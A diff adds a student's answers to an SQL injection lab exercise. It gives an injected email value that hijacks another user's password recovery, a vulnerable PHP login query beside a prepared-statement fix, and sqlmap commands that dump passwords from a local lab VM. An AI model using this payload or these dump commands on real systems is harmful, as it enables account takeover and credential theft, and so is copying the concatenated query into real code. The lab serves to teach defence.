@@ -1,0 +1,58 @@
+Sql Injection:
+
+1) Explain what the following does and how it is used to give hacker bobusers password.
+
+    x'; update members set email='hacker@localhost' where email='bobuser@localhost
+
+    Whenever the user inputs the email hacker@localhost, it emails hacker the bobuser account information. bobuser
+	email cannot be used anymore and any email sent to bobuser is sent to hacker instead.
+
+2) Provide inputs below and explanation, which will lead to hacker obtaining a password for another user.
+
+   1. x'; update members set email='hacker@localhost' where email='user1@localhost in the query # sqlinjection that changes user1 email to hacker email
+   2. hacker@localhost in the query # send the recovery email to hacker of user1 
+   3. open a terminal and login to hacker
+   4. mail and press enter
+   5. hacked!
+
+3) Explain the difference between the code in the following two files...
+
+   siMailLogin.php
+	$query="SELECT email, passwd, login_id, full_name from members where email='$_REQUEST[email]';";
+	$result=pg_query($dbconn, $query);
+
+   jams all the query together and runs it which can cause query's to run sql injected code
+
+   siMailLoginSecure.php
+	$query="SELECT email, passwd, login_id, full_name from members where email=$1;";
+	$result = pg_prepare($dbconn, "find_user", $query);
+	$result = pg_execute($dbconn, "find_user", array($_REQUEST[email])); 
+
+   slices the query and prevents query to be run for sql injection
+
+Kali Linux and SQLMap:
+
+1) Translate all of the SQLMap commands from the linked tutorial so that they apply to
+   the Ubuntu VM and the vulnerable demo application above. The goal is to get the passwords.
+
+   ORIGINAL: http://testphp.vulnweb.com/listproducts.php?cat=* 
+   TRANSLATED: http://192.168.10.128/sqlInjection/siMailLogin.php?email=*
+
+   ORIGINAL: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs 
+   TRANSLATED: sqlmap -u http://192.168.10.128/sqlInjection/siMailLogin.php?email=1 --dbs
+
+   ORIGINAL: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables 
+   TRANSLATED: sqlmap -u http://192.168.10.128/sqlInjection/siMailLogin.php?email=1 -D public --tables
+
+   ORIGINAL: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns 
+   TRANSLATED: sqlmap -u http://192.168.10.128/sqlInjection/siMailLogin.php?email=1 -D public -T members --columns
+
+   ORIGINAL: sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump 
+   TRANSLATED: sqlmap -u http://192.168.10.128/sqlInjection/siMailLogin.php?email=1 -D public -T members -C passwd --dump
+
+2) Determine if sqlMap finds siMailLoginSecure.php vulnerable. Report your result below.
+
+   SQLMAP COMMAND: sqlmap -u http://192.168.10.128/sqlInjection/siMailLoginSecure.php?email=1 --dbs
+   RESULT: All tested parameters do not appear to be injectable. 
+
+
